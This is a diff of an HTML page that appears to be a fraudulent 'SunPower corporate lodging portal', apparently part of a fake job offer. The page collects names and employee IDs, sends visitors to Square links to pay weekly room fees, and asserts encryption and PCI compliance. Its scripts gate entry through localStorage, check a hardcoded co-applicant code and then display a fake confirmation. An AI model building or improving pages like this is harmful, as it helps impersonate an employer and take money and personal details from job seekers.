@@ -1,7 +1,4 @@
-
-
- 
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
@@ -48,7 +45,6 @@
     border-radius: 10px;
     box-shadow: 0 6px 18px rgba(0,0,0,0.08);
     font-size: 14px;
-    color: #222;
     line-height: 1.5;
   }
 
@@ -61,19 +57,10 @@
     box-shadow: 0 8px 20px rgba(0,0,0,0.08);
   }
 
-  .hotel-card h2, .room-card h3, .policy-card h3 {
-    margin-top: 0;
-  }
-
   .amenities, .policy-card ul {
     padding-left: 18px;
     font-size: 14px;
     color: #555;
-    margin: 10px 0 0 0;
-  }
-
-  .slider-container {
-    margin: 15px 0;
   }
 
   .slider img {
@@ -82,27 +69,16 @@
     margin-bottom: 10px;
   }
 
-  .room-details p {
-    font-size: 14px;
-    margin: 8px 0;
-  }
-
-  .reserve-form {
-    margin-top: 15px;
-  }
-
   .reserve-form .form-group {
     margin-bottom: 12px;
   }
 
   .reserve-form label {
-    display: block;
     font-size: 14px;
-    margin-bottom: 4px;
     font-weight: 600;
   }
 
-  .reserve-form input, .reserve-form select {
+  .reserve-form input {
     width: 100%;
     max-width: 220px;
     padding: 8px;
@@ -121,29 +97,23 @@
     border-radius: 8px;
     text-decoration: none;
     font-weight: 600;
-    box-shadow: 0 6px 12px rgba(0,0,0,0.12);
     cursor: pointer;
-    transition: all 0.25s ease;
   }
 
-  .pay-btn:hover {
-    background: #0059c1;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+  .pay-btn.final {
+    background: #2ecc71;
   }
 
   .secure-note {
     font-size: 12px;
     color: #555;
-    margin-top: 5px;
   }
 
   footer.footer {
-    margin-top: 40px;
+    margin: 40px 0;
     text-align: center;
     font-size: 13px;
     color: #888;
-    padding: 20px 0;
-    background: #f2f4f7;
   }
 </style>
 </head>
@@ -158,137 +128,134 @@
   </div>
 </header>
 
-<!-- Mensaje corporativo -->
 <div class="info-note">
-  Welcome to the SunPower Corporate Lodging System. Please complete the reservation below. 
-  After submitting, you will receive an official email with the hotel address, check-in date, and all instructions necessary for your assignment. Ensure all information is correct.
+  This is the official SunPower corporate lodging portal.  
+  After completing this step, you will receive a confirmation email with hotel address, check-in instructions, and assignment details.
 </div>
 
-<!-- Hotel Info -->
 <section class="hotel-card">
   <h2>Executive Inn & Suites</h2>
-  <p>Approved corporate lodging for SunPower employees and contractors.</p>
   <ul class="amenities">
     <li>Free Parking</li>
     <li>High-Speed Wi-Fi</li>
-    <li>Air Conditioning</li>
     <li>Private Bathroom</li>
     <li>Corporate Use Only</li>
-    <li>No Public Booking</li>
   </ul>
 </section>
 
-<!-- Room 1 -->
+<!-- ROOM 1 -->
 <section class="room-card">
-  <div class="room-header">
-    <h3>Standard Room – 1 Bed</h3>
-    <span class="price">$79 / week</span>
-  </div>
+  <h3>Standard Room – 1 Bed</h3>
+  <p>$79 / week</p>
 
-  <div class="slider-container">
-    <div class="slider">
-      <img src="foto1.jpg" />
-      <img src="foto2.jpg" />
+  <form class="reserve-form">
+    <div class="form-group">
+      <label>Full Name</label>
+      <input type="text" required />
     </div>
-  </div>
+    <div class="form-group">
+      <label>Employee ID</label>
+      <input type="text" required />
+    </div>
 
-  <div class="room-details">
-    <p>1 Queen Bed · Private Bathroom · Wi-Fi · Parking</p>
-
-    <form class="reserve-form">
-      <div class="form-group">
-        <label>Full Name</label>
-        <input type="text" placeholder="Enter your full name" required />
-      </div>
-      <div class="form-group">
-        <label>Employee ID</label>
-        <input type="text" placeholder="Enter your Employee ID" required />
-      </div>
-      <div class="form-group">
-        <label>Check-in</label>
-        <input type="text" value="Start of job assignment" disabled />
-      </div>
-      <div class="form-group">
-        <label>Check-out</label>
-        <input type="text" value="End of job assignment" disabled />
-      </div>
-
-      <a class="pay-btn" href="https://square.link/u/rQTpIlWx" target="_blank">
-        Reserve & Pay 
-      </a>
-      <div class="secure-note">🔒 Secure payment processed by Square</div>
-    </form>
-  </div>
+    <a class="pay-btn" href="https://square.link/u/rQTpIlWx" target="_blank">
+      Reserve & Pay $79
+    </a>
+    <div class="secure-note">Secure payment via Square</div>
+  </form>
 </section>
 
-<!-- Room 2 -->
+<!-- ROOM 2 -->
 <section class="room-card">
-  <div class="room-header">
-    <h3>Standard Room – 2 Beds</h3>
-    <span class="price">$89 / week</span>
-  </div>
+  <h3>Standard Room – 2 Beds</h3>
+  <p>$89 / week</p>
 
-  <div class="slider-container">
-    <div class="slider">
-      <img src="foto3.jpg" />
-      <img src="foto4.jpg" />
+  <form class="reserve-form">
+    <div class="form-group">
+      <label>Full Name</label>
+      <input type="text" required />
     </div>
-  </div>
+    <div class="form-group">
+      <label>Employee ID</label>
+      <input type="text" required />
+    </div>
 
-  <div class="room-details">
-    <p>2 Beds · Private Bathroom · Wi-Fi · Parking</p>
+    <!-- PAYMENT -->
+    <a class="pay-btn" href="https://square.link/u/WqXjxpmq" target="_blank">
+      Reserve & Pay $89
+    </a>
 
-    <form class="reserve-form">
-      <div class="form-group">
-        <label>Full Name</label>
-        <input type="text" placeholder="Enter your full name" required />
-      </div>
-      <div class="form-group">
-        <label>Employee ID</label>
-        <input type="text" placeholder="Enter your Employee ID" required />
-      </div>
-      <div class="form-group">
-        <label>Check-in</label>
-        <input type="text" value="Start of job assignment" disabled />
-      </div>
-      <div class="form-group">
-        <label>Check-out</label>
-        <input type="text" value="End of job assignment" disabled />
-      </div>
+    <!-- CO-APPLICANT -->
+    <div style="margin-top:20px; padding:15px; border:1px dashed #ccc; border-radius:10px;">
+      <p style="font-size:13px;">
+        <strong>Co-Applicant Access</strong><br>
+        If you are sharing this room and already have a co-applicant code, enter it below.
+        Payment is not required.
+      </p>
 
-      <a class="pay-btn" href="https://square.link/u/WqXjxpmq" target="_blank">
-        Reserve & Pay
-      </a>
-      <div class="secure-note">🔒 Secure payment processed by Square</div>
-    </form>
-  </div>
+      <input
+        type="text"
+        id="coCode"
+        placeholder="Enter co-applicant code"
+      />
+
+      <button
+        type="button"
+        id="finalizeBtn"
+        class="pay-btn final"
+        style="display:none;"
+      >
+        Finalize Reservation
+      </button>
+    </div>
+
+    <div class="secure-note">
+      Payments redirect to Square. All transactions are encrypted.
+    </div>
+  </form>
 </section>
 
-<!-- Policies -->
 <section class="policy-card">
-  <h3>Corporate Policies & Payment Security</h3>
+  <h3>Corporate Policies</h3>
   <ul>
-    <li>Access limited to SunPower employees and authorized contractors.</li>
-    <li>Check-in occurs at the start of your job assignment; check-out occurs automatically at the end.</li>
-    <li>Payments are securely processed via Square.</li>
-    <li>No payment information is stored on this website.</li>
-    <li>All transactions are encrypted and PCI-compliant.</li>
+    <li>Check-in at job start · Check-out at job completion</li>
+    <li>Corporate use only</li>
+    <li>PCI-compliant secure payments</li>
   </ul>
-  <p>By completing this reservation, you confirm compliance with SunPower corporate lodging policies.</p>
 </section>
 
 <footer class="footer">
-  ©️ 2026 SunPower Corporation · Corporate Lodging Agreement
+  ©️ 2026 SunPower Corporation
 </footer>
 
-<!-- 🔐 CONTROL DE FLUJO -->
 <script>
-  // Solo permite entrar si vienen de aplicacion.html
-  if(localStorage.getItem("applicationCompleted") !== "true") {
+  // 🔐 FLOW CONTROL
+  if (localStorage.getItem("applicationCompleted") !== "true") {
     window.location.href = "index.html";
   }
+
+  // 🔑 CO-APPLICANT CODE LOGIC
+  const coCode = document.getElementById("coCode");
+  const finalizeBtn = document.getElementById("finalizeBtn");
+
+  coCode.addEventListener("input", () => {
+    finalizeBtn.style.display = (coCode.value === "45786") ? "inline-block" : "none";
+  });
+
+  finalizeBtn.addEventListener("click", () => {
+    document.body.innerHTML = `
+      <div style="min-height:100vh; display:flex; align-items:center; justify-content:center;">
+        <div style="background:#fff; padding:40px; border-radius:14px; text-align:center;">
+          <h2>Reservation Completed</h2>
+          <p>You will receive a confirmation email shortly.</p>
+        </div>
+      </div>
+    `;
+  });
 </script>
 
 </body>
 </html>
 
+ 
+   
